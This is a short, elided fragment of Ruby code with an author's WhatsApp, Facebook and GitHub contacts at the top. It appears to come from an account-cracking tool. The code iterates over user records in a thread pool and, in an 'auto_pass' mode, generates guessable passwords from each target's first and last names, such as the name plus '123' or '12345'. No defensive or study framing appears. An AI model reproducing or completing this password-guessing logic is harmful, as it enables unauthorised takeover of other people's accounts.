...
WhatsApp: +8801706357376
Facebook: https://www.facebook.com/apurboshorkar0
Github  : A7UR80
      ...
      @email.each do |usr|
        @pool.schedule do
          ...
          if @auto_pass
            ...
            name = usr['name'].split
            (name.length == 1) ? pass = [name.first + '123',name.first + '12345',name.first + '321',name.first + '#'] : pass = [name.first + '123',name.first + '12345',name.last + '123',name.last + '@',name.last + '00']
